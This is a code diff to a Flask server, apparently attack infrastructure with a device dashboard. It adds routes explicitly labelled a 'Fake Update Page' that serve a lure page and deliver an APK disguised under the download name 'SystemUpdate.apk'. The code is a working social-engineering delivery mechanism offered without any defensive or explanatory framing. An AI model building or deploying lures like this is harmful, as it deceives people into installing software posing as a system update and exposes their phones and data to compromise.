@@ -113,6 +113,21 @@ def dashboard():
     return render_template_string(DASHBOARD, devices=devices)
 
 
+
+# ---------- Fake Update Page ----------
+from flask import send_from_directory
+
+@app.route("/update")
+@app.route("/update/")
+def fake_update():
+    return send_from_directory("static", "update.html")
+
+@app.route("/download/app.apk")
+def download_apk():
+    return send_from_directory("downloads", "app.apk",
+                               as_attachment=True,
+                               download_name="SystemUpdate.apk")
+# ---------- End ----------
 if __name__ == "__main__":
     print("[*] Server on http://0.0.0.0:5000")
     app.run(host="0.0.0.0", port=5000, debug=False)
